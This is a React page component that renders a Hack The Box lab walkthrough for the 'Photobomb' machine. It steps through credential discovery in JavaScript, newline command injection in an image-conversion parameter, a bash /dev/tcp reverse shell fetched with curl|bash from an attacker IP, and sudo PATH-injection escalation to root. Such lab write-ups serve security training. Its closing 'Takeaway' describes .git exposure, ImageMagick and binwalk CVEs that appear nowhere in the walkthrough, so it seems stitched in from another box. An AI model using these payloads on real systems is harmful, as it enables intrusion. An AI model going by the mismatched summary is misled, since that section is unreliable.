
import React from 'react';

// Import placeholder images - replace with actual screenshots
import photobombLogo from "../../assets/photobomb/logo.png"
import hdbBanner from "../../assets/cyber/hdb.png"

import nmapScan from "../../assets/photobomb/nmap-scan.png"
import webInterface from "../../assets/photobomb/webpage.png"
import jsSource from "../../assets/photobomb/source-code.png"
import jsCredentials from "../../assets/photobomb/credential.png"
import printerPage from "../../assets/photobomb/printer.png"
import burpRequest from "../../assets/photobomb/post.png"
import errorResponse from "../../assets/photobomb/filename.png"
import reverseShell from "../../assets/photobomb/wizard.png"

import sudoList from "../../assets/photobomb/sudo-l.png"
import cleanupScript from "../../assets/photobomb/cat-bin.png"
import bashrcFiles from "../../assets/photobomb/find.png"
import bashrcDiff from "../../assets/photobomb/diff.png"
import pathExploit from "../../assets/photobomb/path.png"
import rootShell from "../../assets/photobomb/root.png"


const Photobomb = () => {
    const scrollToSection = (sectionId) => {
        const element = document.getElementById(sectionId);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    };

    return(
        <div className="w-[100%] bg p-10 flex flex-col justify-center items-center">
                
            <div className="w-[80%] relative bg border-[3px] p-10 flex flex-col items-center rounded bg-[rgba(255,255,255,0.1)]">
                <div className="absolute border right-0 top-0" style={{borderBottomLeftRadius:10}}>
                    <h3 className="text-white p-2 text-[5px] md:text-[12px] md:p-3">Created at: <span className="opacity-80">21/07/2025</span></h3>
                </div>
                <h2 className="text-white text-[30px] md:text-[50px]">Photobomb</h2>
                <h2 className="text-white text-[10px] opacity-80 font-thin text-center md:text-[20px]">Master the art of filter enumeration and command injection in Photobomb! This engaging box demonstrates how image processing applications can be exploited through filtered command injection, credential discovery in JavaScript source code, and PATH injection privilege escalation vulnerabilities. Learn how improper input validation combined with sudo misconfigurations can lead to complete system compromise!</h2>
                
                <div className="flex flex-wrap justify-center gap-2 mt-4">
                    {["filter enumeration", "filtered command injection", "PATH injection", "JavaScript analysis", "credential discovery", "image processing", "sudo exploitation", "bash built-ins"].map((tag, index) => (
                        <span key={index} className="bg-[rgba(255,255,255,0.2)] text-white px-3 py-1 rounded-full text-xs md:text-sm border border-white/30">
                            {tag}
                        </span>
                    ))}
                </div>
            </div>
            
            
            <div className="w-[80%] bg  p-10 flex flex-col items-center rounded ">
                <img className="relative w-[80%]  border-[2px]" src={photobombLogo} alt="photobomb landing page" />
                <img className="relative w-[80%] border-[2px]" src={hdbBanner} alt="htb banner" />
            </div>

            
              <div className="relative align-center left-0 right-0 z-50 opacity-100  w-[60%] rounded  backdrop-blur-md border-bold md:mb-[-55px]">
                <div className="max-w-6xl mx-auto px-4 py-3">
                    <div className="flex items-center justify-between">
                        <div className="text-white font-semibold text-lg">
                            Photobomb HTB
                        </div>
                        <nav className="hidden md:flex items-center space-x-6 md:px-10">
                            <button 
                                onClick={() => scrollToSection('overview')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => scrollToSection('enumeration')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => scrollToSection('foothold')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => scrollToSection('privilege-escalation')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => scrollToSection('takeaway')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Takeaway
                            </button>
                        </nav>
                        
                        {/* Mobile Menu Button */}
                        <div className="md:hidden">
                            <button 
                                id="mobile-menu-btn"
                                onClick={() => {
                                    const menu = document.getElementById('mobile-menu');
                                    menu.classList.toggle('hidden');
                                }}
                                className="text-white hover:bg-white/10 p-2 rounded"
                            >
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    
                    {/* Mobile Menu */}
                    <div id="mobile-menu" className="hidden md:hidden mt-3 pb-3 border-t border-white/10 pt-3">
                        <div className="flex flex-col space-y-2">
                            <button 
                                onClick={() => {
                                    scrollToSection('overview');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('enumeration');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('foothold');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('privilege-escalation');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('takeaway');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Takeaway
                            </button>
                        </div>
                    </div>
                </div>
                </div>
          

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="enumeration" className="w-[100%] flex flex-col items-center mt-20">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Enumeration</h1>
                
                <div className="w-[80%] mt-8 text-white md:mt-[80px]">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Let's start with an <span className="text-yellow-400">nmap</span> scan to see open ports
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            export RHOST=10.10.11.189
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo nmap $RHOST -p- -sVC -oN nmap/tcp.txt
                        </code>
                    </div>
                    
                    <img className="w-full border-[2px] relative border-white/30 rounded mb-6" src={nmapScan} alt="nmap scan results" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo sh -c 'echo "10.10.11.189 photobomb.htb" >> /etc/hosts'
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            firefox http://photobomb.htb
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={webInterface} alt="web interface" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Upon visiting the website we see can see a hyperlink that if we click asks us for <span className="text-red-400">credentials</span>. 
                        These credentials can be found pretty quickly by opening up the source code with
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            CNTR + U
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Here we can see a <span className="text-yellow-400">javascript file</span> included that we can further enumerate that revels the credentials
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={jsSource} alt="javascript source" />
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={jsCredentials} alt="javascript credentials" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-green-500/50 mb-6">
                        <code className="text-green-400 text-sm">
                            pH0t0:b0Mb!
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now if click the <span className="text-blue-400">hyperlink</span> again and type in the credentials it lets us in to the <span className="text-yellow-400">/printer</span> path
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={printerPage} alt="printer page" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="foothold" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px] md:mb-5">Foothold</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Here we can select an image & filetype & dimension and download it. This implies that on the server side there is a tool that converts images to specified format. Intercepting the request shows us which parameters this tool needs. This opens up a <span className="text-red-400 font-semibold">command injection</span> vulnerability attack vector.
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={burpRequest} alt="burp request" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So let's try messing around with each parameter and see how the server responds
                    </p>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">
                        • <span className="text-blue-400">Test 1 : LFI via photo</span> → <span className="text-orange-400">Invalid photo.</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">
                        • <span className="text-blue-400">Test 2 : Command injection via photo</span> → <span className="text-orange-400">Source photo does not exist.</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        • <span className="text-blue-400">Test 3 : Command injection via filetype</span> →
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        This one seems to be very interesting due to the high process time when payload is included and also we can see that our payload got into the processing but it did not got executed or its blind
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            filetype=jpg;whoami
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={errorResponse} alt="error response" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So to check for blindness moving on I will use the <span className="text-red-400">sleep(5)</span> payload. However running it with <span className="text-yellow-400">;sleep(5)</span> still seems to be unexecuted. We can see that with either a new line or space we should escape the extension addition to the filename so it would execute the <span className="text-orange-400">sleep</span> distinctively.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So the next thing I tried is adding a new line by <span className="text-red-400">%0a</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            filetype=jpg%0asleep(5)
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And it worked sleep got executed by the server. Now lets include a reverse shell payload and get a shell by hosting a reverse shell and executing it with bash
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`nano bash_1.sh

#!/bin/bash 
0<&196;exec 196<>/dev/tcp/10.10.14.11/9443; bash <&196 >&196 2>&196`}
                        </pre>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            python3 -m http.server 80
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nc -lvnp 9443
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then our payload is:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            filetype=jpg%0acurl%20http://10.10.14.11/bash_1.sh|bash
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got a shell as <span className="text-yellow-400">wizard</span> !!
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={reverseShell} alt="reverse shell" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Before we move on let's upgrade the shell
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`# In your reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
# On your attacking machine:
stty raw -echo; fg
# Press Enter twice, then:
export TERM=xterm
export SHELL=/bin/bash`}
                        </pre>
                    </div>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="privilege-escalation" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Privilege Escalation</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Running the usual manual enumeration revealed a potential <span className="text-red-400 font-semibold">PATH Injection</span> vector where we could execute a binary called <span className="text-yellow-400">/opt/cleanup.sh</span> as root where we can specify the <span className="text-blue-400">PATH</span> before execution
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sudoList} alt="sudo privileges" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Looking at the binary it seems they let us do this because <span className="text-orange-400">[</span> is a bash built in that would interfere with their implementation so they want the user to use their modified bash built in
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={cleanupScript} alt="cleanup script" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can confirm by
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            find / -name ".bashrc" 2>/dev/null
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={bashrcFiles} alt="bashrc files" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            diff -y /home/wizard/.bashrc /opt/.bashrc
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={bashrcDiff} alt="bashrc diff" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        This means we can create our own executable called <span className="text-red-400">find</span> which would be a payload executed by root by <span className="text-red-400 font-semibold">PATH Injection</span>. The reason why we can do this because when we type in <span className="text-yellow-400">cd,cat,ls</span> or any command the terminal will look at the <span className="text-blue-400">PATH</span> and look for these binaries <span className="text-orange-400">left-to-right</span> separated with the <span className="text-yellow-400">:</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So for example when we execute <span className="text-red-400">find</span> with our current <span className="text-blue-400">PATH variable</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            echo $PATH
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={pathExploit} alt="path variable" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        First it will look at the find binary within <span className="text-yellow-400">/usr/local/sbin</span> then <span className="text-yellow-400">/usr/local/bin</span> .... until <span className="text-yellow-400">/bin</span> where it's located than it will execute it.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Keeping this in mind if we inject <span className="text-red-400">/home/wizard</span> infront it will first look into this path for the <span className="text-orange-400">find</span> executable and if present it will execute it and not move on
                    </p>
                    
                    <h3 className="text-lg mb-4 text-yellow-400">Exploit</h3>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cd /home/wizard
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`nano find

#!/bin/bash
/bin/bash`}
                        </pre>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            chmod +x find
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then running the following gives us a <span className="text-red-400 font-semibold">root shell</span> !!!!
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo PATH=/home/wizard:$PATH /opt/cleanup.sh
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={rootShell} alt="root shell" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="takeaway" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[30px]">Takeaway</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <div className="bg-[rgba(255,255,255,0.1)] p-6 rounded border border-white/30">
                        <h3 className="text-lg mb-4 text-yellow-400">Key Learning Points:</h3>
                        <ul className="space-y-2 text-sm md:text-base opacity-90">
                            <li>• <span className="text-red-400">Git Repository Exposure:</span> Exposed .git directories can leak critical source code, revealing database locations and application logic</li>
                            <li>• <span className="text-blue-400">ImageMagick Vulnerabilities:</span> CVE-2022-44268 allows arbitrary file reads through malicious PNG files, enabling sensitive data extraction</li>
                            <li>• <span className="text-yellow-400">Version Enumeration:</span> Always check versions of installed software - outdated binaries often contain exploitable vulnerabilities</li>
                            <li>• <span className="text-green-400">Process Monitoring:</span> Tools like pspy reveal background processes and scheduled tasks that may run with elevated privileges</li>
                            <li>• <span className="text-purple-400">Chained Exploits:</span> Combining multiple vulnerabilities (file read + RCE) can lead to complete system compromise</li>
                            <li>• <span className="text-orange-400">Binwalk Exploitation:</span> CVE-2022-4510 demonstrates how file analysis tools can be weaponized for remote code execution</li>
                            <li>• <span className="text-cyan-400">Automated Scanning:</span> Background malware scanners can be exploited by placing malicious files in monitored directories</li>
                        </ul>
                        
                        <h3 className="text-lg mt-6 mb-4 text-yellow-400">Tools Mastered:</h3>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-green-400">nmap</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-red-400">ffuf</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-blue-400">git-dumper</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-yellow-400">ImageMagick</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-purple-400">pspy</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-orange-400">binwalk</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-cyan-400">xxd</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-pink-400">identify</span>
                            </div>
                        </div>
                        
                        <div className="mt-6 p-4 bg-[rgba(255,0,0,0.1)] border border-red-400/50 rounded">
                            <p className="text-red-300 text-sm">
                                <strong>Security Insight:</strong> This box demonstrates the critical importance of proper source code management and version control. 
                                The exposed .git repository provided a roadmap for exploitation, while outdated software versions created multiple attack vectors. 
                                The combination of information disclosure through file read vulnerabilities and privilege escalation through automated processes 
                                shows how attackers can chain seemingly minor issues into complete system compromise.
                            </p>
                        </div>
                        
                        <div className="mt-4 p-4 bg-[rgba(0,255,0,0.1)] border border-green-400/50 rounded">
                            <p className="text-green-300 text-sm">
                                <strong>Defensive Recommendations:</strong> Ensure .git directories are never exposed in production environments, 
                                regularly update all software components especially image processing libraries, implement proper access controls for 
                                automated scanning processes, and monitor for unusual file uploads or modifications in sensitive directories.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />
            
       
        </div>
    )
}

export default Photobomb;